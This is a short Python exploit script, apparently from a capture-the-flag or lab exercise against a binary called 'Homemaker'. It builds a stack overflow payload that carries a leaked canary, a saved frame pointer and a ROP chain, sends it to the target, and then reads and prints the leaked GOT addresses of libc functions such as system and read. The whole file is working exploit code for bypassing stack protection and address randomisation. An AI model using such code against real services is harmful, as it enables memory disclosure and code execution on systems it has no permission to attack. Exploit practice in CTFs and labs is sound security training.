#!/usr/bin/env python
"""Homemaker: validate the 2KB write + ROP read harness by re-reading the GOT."""
import struct
import sys

import hmlib as H

s, mem = H.setup()
chain = H.rop_reads(s.base, [s.base + H.GOT_CTX])
card = H.build_card(s.mema, s.canary, s.saved_rbp, chain)
out = s.big_card_and_run(card, drain=9.0)
print("[*] frames: %d" % len(out))
for body, ok in out:
    print("    len=%d crc_ok=%s head=%r" % (0 if body is None else len(body) - 1, ok,
                                            body[:12] if body else None))
    if body and len(body) > 0x20:
        data = body[1:]
        open("analysis/got2.bin", "wb").write(data)
        for name, off in [("write", 0x3fa8), ("stack_chk_fail", 0x3fb0), ("system", 0x3fb8),
                          ("read", 0x3fc0), ("memcpy", 0x3fc8), ("setvbuf", 0x3fd0),
                          ("start_main", 0x3fd8), ("nr_mmap?", 0x3fe0)]:
            i = off - H.GOT_CTX
            if i + 8 <= len(data):
                print("      %-16s %#x" % (name, struct.unpack("<Q", data[i:i + 8])[0]))
s.s.close()
